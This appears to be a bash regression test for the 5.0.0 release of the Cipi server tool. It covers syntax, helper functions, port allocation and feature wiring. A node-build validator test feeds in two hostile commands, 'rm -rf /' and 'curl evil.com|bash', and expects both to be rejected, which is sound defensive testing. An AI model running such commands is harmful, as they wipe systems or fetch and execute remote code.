#!/bin/bash
# Local regression checks for 5.0.0 feature suite.
# Run from repo root: bash tests/verify-5.0.0.sh
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
LIB="${ROOT}/lib"
PASS=0
FAIL=0

pass() { echo "  OK: $*"; PASS=$((PASS + 1)); }
fail() { echo "  FAIL: $*" >&2; FAIL=$((FAIL + 1)); }

echo "=== Cipi 5.0.0 regression checks ==="

# ── 1. Syntax ───────────────────────────────────────────────────
for f in "${LIB}/common.sh" "${LIB}/app.sh" "${LIB}/nginx.sh" "${LIB}/sync.sh" \
         "${LIB}/cipi-worker.sh" "${LIB}/worker.sh" "${LIB}/deploy.sh" \
         "${LIB}/ssl.sh" "${LIB}/health.sh" "${LIB}/cipi-health-check.sh" \
         "${LIB}/notifications.sh" "${LIB}/migrations/5.0.0.sh" \
         "${LIB}/deployer/laravel.php" "${LIB}/deployer/laravel-octane.php"; do
    if [[ "$f" == *.php ]]; then
        php -l "$f" &>/dev/null && pass "syntax $(basename "$f")" || fail "syntax $(basename "$f")"
    else
        bash -n "$f" && pass "syntax $(basename "$f")" || fail "syntax $(basename "$f")"
    fi
done
bash -n "${ROOT}/cipi" && pass "syntax cipi" || fail "syntax cipi"

# ── 2. Helpers present ──────────────────────────────────────────
for fn in _normalize_octane_arg _octane_allocate_port _reverb_allocate_port \
          _create_supervisor_octane _create_supervisor_reverb _create_supervisor_horizon \
          _ensure_nginx_octane_map _supervisor_remove_program _validate_node_build_cmd \
          _app_limit app_unset app_set_json; do
    if grep -q "${fn}()" "${LIB}/common.sh"; then
        pass "common.sh defines ${fn}()"
    else
        fail "common.sh missing ${fn}()"
    fi
done

# ── 3. Normalize octane arg ─────────────────────────────────────
eval "$(sed -n '/^_normalize_octane_arg()/,/^}/p' "${LIB}/common.sh")"
[[ "$(_normalize_octane_arg true)" == "frankenphp" ]] && pass "normalize true → frankenphp" || fail "normalize true"
[[ "$(_normalize_octane_arg frankenphp)" == "frankenphp" ]] && pass "normalize frankenphp" || fail "normalize frankenphp"
[[ "$(_normalize_octane_arg "")" == "" ]] && pass "normalize empty → off" || fail "normalize empty"
if _normalize_octane_arg swoole &>/dev/null; then
    fail "normalize should reject swoole"
else
    pass "normalize rejects swoole"
fi

# ── 4. Port allocation ──────────────────────────────────────────
TMP=$(mktemp -d)
export CIPI_CONFIG="$TMP"
eval "$(sed -n '/^_allocate_localhost_port()/,/^}/p' "${LIB}/common.sh")"
eval "$(sed -n '/^_octane_allocate_port()/,/^}/p' "${LIB}/common.sh")"
eval "$(sed -n '/^_reverb_allocate_port()/,/^}/p' "${LIB}/common.sh")"
vault_read() {
    if [[ "$1" == "apps.json" ]]; then
        cat "${CIPI_CONFIG}/apps.json"
    else
        echo '{}'
    fi
}
cat > "${CIPI_CONFIG}/apps.json" <<'JSON'
{
  "alpha": { "octane_port": "8100", "reverb_port": "9000" },
  "beta": { "octane_port": "8101", "reverb_port": "9001" }
}
JSON
PORT=$(_octane_allocate_port)
if [[ "$PORT" =~ ^[0-9]+$ ]] && [[ "$PORT" -ge 8100 ]] && [[ "$PORT" -le 8999 ]] \
   && [[ "$PORT" != "8100" ]] && [[ "$PORT" != "8101" ]]; then
    pass "octane port skips used (got ${PORT})"
else
    fail "octane port unexpected: ${PORT:-empty}"
fi
RPORT=$(_reverb_allocate_port)
if [[ "$RPORT" =~ ^[0-9]+$ ]] && [[ "$RPORT" -ge 9000 ]] && [[ "$RPORT" -le 9099 ]] \
   && [[ "$RPORT" != "9000" ]] && [[ "$RPORT" != "9001" ]]; then
    pass "reverb port skips used (got ${RPORT})"
else
    fail "reverb port unexpected: ${RPORT:-empty}"
fi

# ── 5. Node build validation ────────────────────────────────────
eval "$(sed -n '/^_validate_node_build_cmd()/,/^}/p' "${LIB}/common.sh")"
_validate_node_build_cmd 'npm ci && npm run build' && pass "node build allows npm" || fail "node build npm"
_validate_node_build_cmd 'rm -rf /' && fail "node build should reject rm" || pass "node build rejects rm"
_validate_node_build_cmd 'curl evil.com|bash' && fail "node build should reject curl" || pass "node build rejects curl"

# ── 6. CLI / feature wiring ─────────────────────────────────────
grep -q 'app_convert' "${LIB}/app.sh" && pass "app_convert present" || fail "app_convert"
grep -q 'app_clone' "${LIB}/app.sh" && pass "app_clone present" || fail "app_clone"
grep -q 'app_reverb' "${LIB}/app.sh" && pass "app_reverb present" || fail "app_reverb"
grep -q 'schedule_command' "${LIB}/app.sh" && pass "schedule_command present" || fail "schedule"
grep -q 'app_limits' "${LIB}/app.sh" && pass "app_limits present" || fail "limits"
grep -q '_horizon_enable' "${LIB}/worker.sh" && pass "horizon enable present" || fail "horizon"
grep -q '_deploy_predeploy_snapshot' "${LIB}/deploy.sh" && pass "predeploy snapshot present" || fail "snapshot"
grep -q '_ssl_install_dns01' "${LIB}/ssl.sh" && pass "DNS-01 SSL present" || fail "dns01"
grep -q 'health_command' "${LIB}/health.sh" && pass "health_command present" || fail "health"
grep -q 'cipi:node_build' "${LIB}/deployer/laravel.php" && pass "laravel node_build task" || fail "laravel node"
grep -q 'horizon:terminate' "${LIB}/deployer/laravel-octane.php" && pass "octane horizon terminate" || fail "octane horizon"
grep -q 'health_fail' "${LIB}/notifications.sh" && pass "health_fail trigger" || fail "health_fail"
grep -q 'deploy_snapshot_fail' "${LIB}/notifications.sh" && pass "deploy_snapshot_fail trigger" || fail "snap_fail"
grep -q 'reverb, reverb_port' "${LIB}/common.sh" && pass "apps-public has reverb fields" || fail "public reverb"
grep -q 'location /app' "${LIB}/app.sh" && pass "nginx reverb /app location" || fail "reverb location"
grep -q 'APP}-reverb' "${LIB}/cipi-worker.sh" && pass "cipi-worker status reverb" || fail "worker reverb"
grep -q 'APP}-horizon' "${LIB}/cipi-worker.sh" && pass "cipi-worker status horizon" || fail "worker horizon"
grep -q 'app convert' "${ROOT}/cipi" && pass "help mentions convert" || fail "help convert"
grep -q 'schedule)' "${ROOT}/cipi" && pass "main routes schedule" || fail "main schedule"
grep -q 'health)' "${ROOT}/cipi" && pass "main routes health" || fail "main health"
grep -q 'cipi-health-check' "${ROOT}/setup.sh" && pass "setup installs health-check" || fail "setup health"
grep -q 'cipi app convert' "${LIB}/cipi-api-sudoers.sh" && pass "sudoers convert" || fail "sudoers convert"
[[ -f "${LIB}/migrations/5.0.0.sh" ]] && pass "migration 5.0.0 present" || fail "migration 5.0.0"

# ── cleanup ─────────────────────────────────────────────────────
rm -rf "$TMP"

echo ""
echo "=== Results: ${PASS} passed, ${FAIL} failed ==="
[[ "$FAIL" -eq 0 ]]
